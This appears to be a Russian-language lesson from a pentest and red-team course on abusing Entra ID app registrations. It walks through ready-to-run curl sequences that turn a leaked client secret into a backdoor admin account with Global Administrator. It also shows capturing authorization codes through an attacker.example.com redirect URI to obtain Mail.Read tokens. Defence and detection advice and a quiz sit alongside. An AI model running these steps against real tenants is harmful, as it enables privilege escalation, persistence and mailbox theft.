---
id: cloud-azure-app-registrations
title: "Entra ID app registrations: разрешения, consent и кража токенов"
category: cloud
parent: cloud-azure-platform-deep
difficulty: expert
order: 3
tags: [cloud, azure, entra-id, app-registration, service-principal, graph, consent]
prerequisites: [cloud-azure-platform-deep, cloud-azure-iam]
useful_for:
  - "Эскалация в Entra ID"
  - "Анализ app registrations и Graph permissions"
  - "Атаки на OAuth consent"
estimated_minutes: 50
summary: "Entra ID app registrations: сервис-принципалы, client secrets/сертификаты, API permissions и admin consent. Как из приложения получить постоянный доступ к Graph и подпискам."
---

## Зачем этот урок

Регистрации приложений (app registrations) — это идентичности приложений в Entra ID. Они имеют сервис-принципал (service principal), набор **API permissions** (например, `Mail.Read`, `Directory.ReadWrite.All`) и креды (client secret или сертификат). В отличие от пользователей, приложения не проходят MFA и их креды живут годами. Ошибки в разрешениях или утёкшие секреты дают **постоянный** доступ к Microsoft Graph и подпискам Azure. Это одна из самых частых причин серьёзных компрометаций в Azure.

## Модель app registrations

- **Application object** — глобальное определение приложения (в tenant).
- **Service principal** — локальный экземпляр приложения в tenant; ему выдаются роли и permissions.
- **Client secret / certificate** — креды приложения; секрет виден только при создании.
- **API permissions** — делегированные (от имени пользователя) или application (без пользователя). Требуют admin consent для привилегированных.
- **App roles** — роли, определённые приложением.
- **Federated credentials** — OIDC-доверие (GitHub Actions, Kubernetes) без секретов.
- **Owners** — кто может менять приложение (важно: owner может добавить секрет/разрешение).

Ключевые разрешения Graph: `Directory.ReadWrite.All`, `AppRoleAssignment.ReadWrite.All`, `Application.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`, `Mail.ReadWrite`, `Files.ReadWrite.All`.

## Инструменты и команды

```bash
# Список приложений и сервис-принципалов
az ad app list --query '[].{AppId:appId,Name:displayName}' --output table
az ad sp list --all --query '[].{AppId:appId,Name:displayName}' --output table

# Разрешения приложения
az ad app permission list --id <appId>
az rest --method get --url "https://graph.microsoft.com/v1.0/applications/<objectId>?$select=displayName,requiredResourceAccess"

# Роли сервис-принципала (в подписке/tenant)
az role assignment list --assignee <appId> --all --query '[].{Role:roleDefinitionName,Scope:scope}'

# Секреты/сертификаты (сроки)
az ad app credential list --id <appId>

# Владельцы
az ad app owner list --id <appId>

# Вход как приложение (client credentials)
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "client_id=<appId>&client_secret=<secret>&scope=https://graph.microsoft.com/.default&grant_type=client_credentials" \
  | jq -r .access_token
```

## Разобранный пример: секрет приложения → Graph → эскалация

Сценарий: в репозитории/логах найден client secret приложения с `Directory.ReadWrite.All`.

```bash
# 1. Получаем токен приложения
TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/TENANT/oauth2/v2.0/token" \
  -d "client_id=APPID&client_secret=SECRET&scope=https://graph.microsoft.com/.default&grant_type=client_credentials" \
  | jq -r .access_token)

# 2. Проверяем, кто мы
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId eq 'APPID'" | jq '.value[0].displayName'

# 3. Если есть Directory.ReadWrite.All — создаём нового админа или добавляем себя в роль
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/users" \
  -d '{"accountEnabled":true,"displayName":"attacker","mailNickname":"attacker","userPrincipalName":"attacker@tenant.onmicrosoft.com","passwordProfile":{"password":"Pwn3d!Pass1","forceChangePasswordNextSignIn":false}}'

# 4. Назначаем роль Global Administrator через Graph (если есть RoleManagement.ReadWrite.Directory)
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  -d '{"principalId":"<userObjectId>","roleDefinitionId":"<GlobalAdminRoleId>","directoryScopeId":"/"}'
```

За несколько минут приложение с широкими разрешениями превращается в Global Administrator. Креды приложения не требуют MFA и не истекают вместе с сессией — это долгосрочный доступ.

## Что проверять в первую очередь

| Объект | Что искать |
|---|---|
| API permissions | `Directory.ReadWrite.All`, `AppRoleAssignment.ReadWrite.All`, `Application.ReadWrite.All` |
| Client secrets | Не истёкшие, длинный срок, утёкшие в репозиториях |
| Certificates | Старые/слабые, с приватным ключом у атакующего |
| Owners | Кто может добавить секрет/разрешение |
| Role assignments | Роли в подписках/management groups |
| Federated credentials | Слабые условия (любой repo/ref) |
| Redirect URIs | Открытые/невалидные, утечка кода |

## Обход защит и edge cases

- **Admin consent required.** Привилегированные разрешения требуют consent; но если consent уже дан — доступ есть. Проверяйте `oauth2PermissionGrants` и `appRoleAssignments`.
- **Conditional Access.** Для client credentials обычно не применяется (нет пользователя), поэтому MFA/CA не мешают.
- **Continuous Access Evaluation.** Может отзывать токены при изменениях; но приложения работают долго.
- **Secret expiration.** Если секрет истёк — нужен новый (owner может добавить). Проверяйте owners.
- **Federated credentials.** Если GitHub Actions доверяет `repo:*:ref:*`, любой форк может получить токен.
- **Consent phishing.** Пользователь может выдать делегированные права вредоносному приложению (не применимо к client credentials).

## Частые ошибки и подводные камни

- Считать, что приложение «без пользователя» безопаснее: client credentials не проходят MFA.
- Не проверить срок секретов: истёкший секрет не работает, но owner может создать новый.
- Игнорировать owners как путь к добавлению секрета.
- Не проверить role assignments сервис-принципала в подписках.
- Путать делегированные и application permissions.

## Защита и детект

- Least privilege для app permissions; убрать избыточные `*.ReadWrite.All`.
- Использовать federated credentials вместо секретов; ротировать секреты и ограничивать срок.
- Ограничить owners; алертить на добавление секретов/разрешений.
- Включить Entra ID audit logs и sign-in logs для сервис-принципалов; алертить на client credentials login из необычных мест.
- Настроить Conditional Access для workload identities (где поддерживается).

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — приложение с `Directory.ReadWrite.All` и секретом на 2 года. Второй — утёкший секрет в репозитории. Третий — owner, который может добавить секрет. Четвёртый — federated credential без ограничения repo/ref. Пятый — сервис-принципал с ролью Contributor в подписке. Все они дают долгосрочный доступ к tenant/подписке.

## Практическое задание

1. Создайте app registration с секретом и разрешением `User.Read.All`; получите токен client credentials.
2. Вызовите Graph и перечислите пользователей.
3. Уменьшите разрешение и убедитесь, что вызов падает.
4. Настройте federated credential для GitHub Actions с ограничением по repo/ref.

## Что дальше / решение

Из app registration получаем токен Graph/ARM. Дальше — перечислять права, создавать админов, читать почту/файлы, эскалировать. Зафиксируйте путь «секрет приложения → Graph → admin» в графе. Если секрета нет, но есть owner — создайте новый секрет. Если прав мало — ищите другие приложения.

## Разобранный пример 2: consent и delegated permissions

Делегированные разрешения действуют от имени пользователя. Их выдают через consent — и это отдельный вектор: вредоносное приложение просит у пользователя доступ к почте/файлам, пользователь соглашается, и приложение получает токен на его ресурсы.

```bash
# Ищем уже выданные grants (кто что согласовал)
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" \
  --query 'value[].{Client:clientId,Resource:resourceId,Scope:scope}' --output table

# Проверяем redirect URIs приложения (утечка кода через открытый redirect)
az ad app show --id <appId> --query 'web.redirectUris'
# ["https://app.example.com/callback","https://attacker.example.com/callback"]

# Если redirect URI открыт — перехватываем authorization code
# 1) жертва переходит по authorize-ссылке
#    https://login.microsoftonline.com/TENANT/oauth2/v2.0/authorize?client_id=APPID&response_type=code&redirect_uri=https://attacker.example.com/callback&scope=Mail.Read
# 2) код приходит на наш redirect
# 3) меняем код на токен
curl -s -X POST "https://login.microsoftonline.com/TENANT/oauth2/v2.0/token" \
  -d "client_id=APPID&grant_type=authorization_code&code=CODE&redirect_uri=https://attacker.example.com/callback&scope=Mail.Read"
```

Открытый или невалидный redirect URI — прямая утечка кода авторизации. А уже выданные `oauth2PermissionGrants` показывают, какие приложения имеют доступ к каким ресурсам: если вредоносное приложение уже согласовано, токен можно получить через refresh. Проверяйте `Mail.Read`, `Files.ReadWrite.All`, `offline_access` — последний даёт refresh-токен для долгосрочного доступа.

## Квиз

```quiz
- question: "Почему креды приложения опасны?"
  options:
    - "Client credentials не требуют MFA и живут долго"
    - "Они истекают каждый час"
    - "Они требуют пароль пользователя"
    - "Они одноразовые"
  answer: 0
  explanation: "Приложение аутентифицируется секретом/сертификатом без интерактивного входа."
- question: "Какое разрешение позволяет управлять пользователями в Graph?"
  options:
    - "Directory.ReadWrite.All"
    - "User.Read"
    - "Mail.Read"
    - "Calendars.Read"
  answer: 0
  explanation: "Directory.ReadWrite.All даёт широкие права на каталог."
- question: "Зачем атакующему быть owner приложения?"
  options:
    - "Owner может добавить новый секрет и получить доступ"
    - "Owner удаляет tenant"
    - "Owner меняет регион"
    - "Owner шифрует данные"
  answer: 0
  explanation: "Владелец может добавить credential к приложению."
- question: "Что безопаснее, чем client secret?"
  options:
    - "Federated credential (OIDC) с ограничением repo/ref"
    - "Секрет без срока"
    - "Секрет на 5 лет"
    - "Публичный сертификат"
  answer: 0
  explanation: "Federated credentials не хранят секрет и ограничиваются условием."
```

## Где пригодится

- **Пентест Azure/Entra ID:** эскалация через приложения.
- **Red team:** долгосрочный доступ к tenant.
- **Blue team:** аудит разрешений и owners.
- **Сертификация:** AZ-500 / SC-300.
